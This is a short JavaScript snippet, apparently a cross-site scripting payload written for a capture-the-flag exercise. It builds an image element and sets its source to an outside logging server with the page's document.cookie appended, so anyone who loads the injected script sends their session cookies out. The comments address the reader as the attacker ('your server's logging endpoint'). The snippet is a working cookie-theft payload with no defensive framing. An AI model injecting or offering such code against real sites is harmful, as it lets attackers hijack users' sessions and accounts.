(function() {
  // Create a new image element
  var img = new Image();
  // Set the source to your server's logging endpoint, with the cookie appended
  img.src = 'https://testctf.sikoprograms.com/log?cookie=' + encodeURIComponent(document.cookie);
})();
